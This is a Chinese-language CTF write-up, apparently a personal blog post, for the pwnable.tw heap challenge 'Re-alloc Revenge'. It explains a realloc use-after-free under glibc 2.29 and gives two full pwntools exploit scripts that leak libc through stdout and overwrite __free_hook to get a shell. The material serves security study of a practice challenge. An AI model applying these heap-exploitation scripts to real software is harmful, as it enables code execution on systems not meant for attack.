---
title: Re-alloc-Revenge
date: 2021-05-30 23:49:43
tags:
layout: default
---
Re-alloc Revenge in pwnable.tw
<!--more-->
# Prologue

realloc-revenge是realloc那题的一个加强版，主要逻辑不变，在allocate里面的realloc变成了malloc，保护全开，依然是2.29的libc。最佳我做到的应该是1/16，只需要猜stdout的半个字节。

# Tricks

漏洞点是realloc在设定size为0时执行free但是指针不清空所有有UAF有几个组合技巧。

本文的伪代码第一个参数为指针的idx，第二个参数为size，第三个参数是写入内容。

## Modify Arbitrary Address

一共就两个可用指针，malloc最大0x78，想要控制任意地址就需要利用realloc的切割。

```python
malloc(0,0x78)
realloc(0,0)
realloc(0,0x78,p64(Arbitrary Address))
malloc(1,0x78)
realloc(1,0x28)
free(1)
malloc(1,0x78,Paylaod)
```

## Fill  tcache

填满tcache需要6个chunk，要求是尽可能只用掉一个size的list，因为如果用切割那么会填满2个而我们后面还有为了清空指针切割两次的操作会用到 `0x80→0x40*2→0x20*2`。可以使用 `realloc-expand`来搞定。

```python
for x in range(7):
    add(0,0x28)
    realloc(0,0x68)
    free(0)
add(0,0x28)
realloc(0,0x68)
add(1,0x18)
free(0)
```

## Edit

这个也不算什么组合。。就是正常的realloc为0之后realloc原来的大小就可以看成是edit了。

# Solution

因为这题我走了些弯路所以有比较直接的1/256的做法和比较绕圈圈的1/16做法。先讲1/16的做法。

## 1/16

要想1/16所堆绝对不能猜，也就是不能用管理tcache的结构体。只能靠填满tcache然后用consolidate来获得一个smallbin。前文的Tricks中已经讲了如何填满tcache所以后面要做的是在menu等待输入的时候输入 `'1'*0x400` 就可以触发。之后比烦需要改两次，一次是把tcache劫持指向获得的smallbin，第二次是把smallbin用前面说到的 `Modify Arbitrary Address` 来partial write smallbin的fd(此处猜1/16)。接着IO_LEAK，之后控制free_hook+get shell，写了70多行。

```python
from pwn import *
context.arch='amd64'
context.terminal=['tmux','split','-h']
def cmd(c):
    p.sendlineafter("ice: ",str(c))
def add(idx,size,c="A"):
    cmd(1)
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":",str(size))
    p.sendafter(":",c)
def realloc(idx,size,c="A"):
    cmd(2)
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":",str(size))
    if(size>0):
        p.sendafter(":",c)
def free(idx):
    cmd(3)
    p.sendlineafter(":",str(idx))
p=remote("chall.pwnable.tw",10310)
#p=process('./pwn')
try:
    add(0,0x28)
    free(0)
    for x in range(6):
        add(0,0x18)
        realloc(0,0x78)
        free(0)
    add(0,0x18)
    realloc(0,0x78)
    add(1,0x18)
    realloc(1,0x78)
    free(1)
    free(0)
    cmd("1"*0x400)
    add(0,0x78)
    realloc(0,0)
    realloc(0,0x28,b'\x90')
    add(1,0x78)
    realloc(1,0x28)
    free(1)
    add(1,0x58)
    realloc(1,0x58,b'\x60\x37')
    realloc(0,0x28,b'\0'*0x10)
    free(0)
    add(0,0x78)
    realloc(0,0x28)
    free(0)
    add(0,0x78,p64(0xfbad1800)+b'\0'*0x18)
    p.read(0x58)
    base=u64(p.read(8))-(0x7ffff7fc1560-0x7ffff7ddb000)
    log.warning(hex(base))
    context.log_level='debug'
    realloc(1,0x28,b'\0'*0x28)
    free(1)
    add(1,0x68)
    realloc(1,0)
    realloc(1,0x18)
    free(1)
    add(1,0x68,b'\0'*0x18+p64(0x71)+p64(0x1e75a8-8+base))
    free(1)
    add(1,0x48)
    free(1)
    add(1,0x48,b'/bin/sh\0'+p64(0x52fd0+base))
    free(1)
    p.interactive()
except Exception:
    p.close()
```

## 1/256

这个方法比较容易想到，就是先猜1/16控制tcache的结构体，之后因为可以随意edit所以就可以随意把chunk放进unsortedbin之类的地方。之后再edit一次把目标获得+partial write，之后就可以IO_LEAK了，后面没什么区别思路也比较直接，不过需要1/256。

```python
from pwn import *
context.arch='amd64'
context.terminal=['tmux','split','-h']
def cmd(c):
    p.sendlineafter("ice: ",str(c))
def add(idx,size,c="A"):
    cmd(1)
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":",str(size))
    p.sendafter(":",c)
def realloc(idx,size,c="A"):
    cmd(2)
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":",str(size))
    if(size>0):
        p.sendafter(":",c)
def free(idx):
    cmd(3)
    p.sendlineafter(":",str(idx))
#p=remote("chall.pwnable.tw",10310)
p=process('./pwn')
try:
    add(0,0x38)
    add(1,0x38)
    free(1)
    realloc(0,0)
    realloc(0,0x38,'\x10\x90')
    add(1,0x38)
    realloc(1,0x18)
    free(1)
    add(1,0x38,'\0'*0x1d+'\xff'*0x1)
    realloc(1,0x58,'\0')
    realloc(0,0x18,'\0'*0x18)
    free(0)
    realloc(1,0x78,'\0'*0x60+'\x60\x37')
    #gdb.attach(p)
    add(0,0x58,p64(0x1800)+b'\0'*0x18)
    context.log_level='debug'
    p.read(0x58)
    base=u64(p.read(8))-(0x7ffff7fc1560-0x7ffff7ddb000)
    log.warning(hex(base))
    realloc(1,0x78,b'\0'*0x60+p64(base+0x1e75a8-8))
    free(1)
    add(1,0x58,b'/bin/sh\0'+p64(0x52fd0+base))
    free(1)
    p.interactive()
except Exception:
    p.close
```

# Epilogue

这题过程中我发现了我之前一直认识错误的东西，我以为IO LEAK需要1/4096的概率（因为我3年前第一次做的时候关了aslr导致以为要写一个字节，后面就定式思维了），其实main_arena后面不远处就是stdout，所以有些情况下不需要多写那个字节，前面说的1/16还有1/256也不是严格的，因为load的地址随机化也有影响：具体是需要乘上系数 `7/16`，因为 unsorted pointer 的offset是0x1e4ca0 而stdout的offset是0x1e5760。

发现自己傻逼了3年。